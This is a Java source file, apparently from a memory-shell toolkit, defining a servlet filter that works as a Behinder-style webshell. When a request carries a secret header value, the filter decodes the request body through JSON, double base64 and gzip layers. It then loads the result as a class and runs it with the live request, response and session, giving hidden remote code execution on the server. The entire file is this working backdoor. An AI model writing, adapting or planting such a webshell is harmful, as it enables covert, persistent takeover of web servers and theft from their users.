package com.reajason.javaweb.memshell.shelltool.behinder;

import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

public class BehinderCustomFilter extends ClassLoader implements Filter {
    public static String headerName;
    public static String headerValue;

    public BehinderCustomFilter() {
    }

    public BehinderCustomFilter(ClassLoader c) {
        super(c);
    }

    @Override
    @SuppressWarnings("all")
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
        HttpServletRequest request = (HttpServletRequest) servletRequest;
        HttpServletResponse response = (HttpServletResponse) servletResponse;

        try {
            if (request.getHeader(this.headerName) != null
                    && request.getHeader(this.headerName).contains(this.headerValue)) {
                HttpSession session = ((HttpServletRequest) servletRequest).getSession();
                Map<String, Object> obj = new HashMap<String, Object>(3);
                obj.put("request", servletRequest);
                obj.put("response", unwrap(response));
                obj.put("session", session);
                session.setAttribute("u", this.headerValue);

                ByteArrayOutputStream bos = new ByteArrayOutputStream();
                byte[] buf = new byte[512];
                int length = request.getInputStream().read(buf);
                while (length > 0) {
                    bos.write(buf, 0, length);
                    length = request.getInputStream().read(buf);
                }
                byte[] data = bos.toByteArray();

                byte[] decrypted = decrypt(data);
                Object instance = new BehinderCustomFilter(Thread.currentThread().getContextClassLoader()).defineClass(decrypted, 0, decrypted.length).newInstance();
                instance.equals(obj);
                return;
            }
        } catch (Throwable e) {
            e.printStackTrace();
        }
        filterChain.doFilter(servletRequest, servletResponse);
    }

    @SuppressWarnings("all")
    private byte[] decrypt(byte[] data) throws Exception {
        String json = new String(data);
        int start = json.indexOf("\"datax\":\"") + 9;
        int end = json.indexOf("\"", start);
        String base64Data = json.substring(start, end);
        
        byte[] decoded1 = base64Decode(base64Data);
        String replaced = new String(decoded1).replace("<", "+").replace(">", "/");
        byte[] decoded2 = base64Decode(replaced);

        ByteArrayOutputStream out = new ByteArrayOutputStream();
        java.io.ByteArrayInputStream in = new java.io.ByteArrayInputStream(decoded2);
        java.util.zip.GZIPInputStream ungzip = new java.util.zip.GZIPInputStream(in);
        byte[] buffer = new byte[256];
        int n;
        while ((n = ungzip.read(buffer)) >= 0) {
            out.write(buffer, 0, n);
        }
        return out.toByteArray();
    }

    @SuppressWarnings("all")
    public Object unwrap(Object obj) {
        try {
            return getFieldValue(obj, "response");
        } catch (Throwable e) {
            return obj;
        }
    }

    @SuppressWarnings("all")
    public static Object getFieldValue(Object obj, String name) throws Exception {
        Class<?> clazz = obj.getClass();
        while (clazz != Object.class) {
            try {
                Field field = clazz.getDeclaredField(name);
                field.setAccessible(true);
                return field.get(obj);
            } catch (NoSuchFieldException var5) {
                clazz = clazz.getSuperclass();
            }
        }
        throw new NoSuchFieldException(obj.getClass().getName() + " Field not found: " + name);
    }

    @SuppressWarnings("all")
    public static byte[] base64Decode(String bs) throws Exception {
        try {
            Object decoder = Class.forName("java.util.Base64").getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, bs);
        } catch (Exception var6) {
            Object decoder = Class.forName("sun.misc.BASE64Decoder").newInstance();
            return (byte[]) decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, bs);
        }
    }

    @Override
    public void init(FilterConfig filterConfig) throws ServletException {
    }

    @Override
    public void destroy() {
    }
}
